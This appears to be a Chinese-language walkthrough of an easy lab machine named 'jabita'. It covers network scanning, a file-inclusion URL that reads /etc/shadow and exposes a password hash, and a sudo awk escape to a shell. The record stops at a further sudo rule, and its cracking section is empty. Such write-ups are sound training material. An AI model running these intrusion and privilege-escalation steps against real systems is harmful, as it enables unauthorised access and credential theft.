
|   |   |   |
|---|---|---|
|jabita|easy|文件包含利用、shadow爆破、sudo-awk 提权、python库劫持提权、python反弹shell|

# 主机发现
```C
┌──(kali㉿kali)-[~]
└─$ sudo netdiscover -i eth0 -r 192.168.44.139/24
```

# 服务探测
```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -A -T 4 -p- 192.168.44.147 
```
22,  80

# 目录扫描
```c
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.44.147 -x php,html.txt.png -e
```

```c
http://192.168.44.147/building   
在这个页面随便点个home
发现这个页面可能存在文件包含http://192.168.44.147/building/index.php?page=home.php
初次尝试得到结果
http://192.168.44.147/building/index.php?page=/etc/shadow


jaba:$y$j9T$pWlo6WbJDbnYz6qZlM87d.$CGQnSEL8aHLlBY/4Il6jFieCPzj7wk54P8K4j/xhi/1:19240:0:99999:7::: 
```
# john爆破




# 提权

```c
jack@jabita:~$ sudo -l
    (jaba : jaba) NOPASSWD: /usr/bin/awk 
```

然后去这个网站搜索相关命令getshell，，，awk
[GTFOBins](https://gtfobins.github.io/)

```c
sudo awk 'BEGIN {system("/bin/sh")}'
```

```c
jack@jabita:~$ sudo -u jaba  /usr/bin/awk 'BEGIN {system("/bin/sh")}'
$ id
uid=1002(jaba) gid=1002(jaba) groups=1002(jaba)

$ script /dev/null -c bash
jaba@jabita:/home/jack$ sudo -l
    (root) NOPASSWD: /usr/bin/python3 /usr/bin/clean.py


```
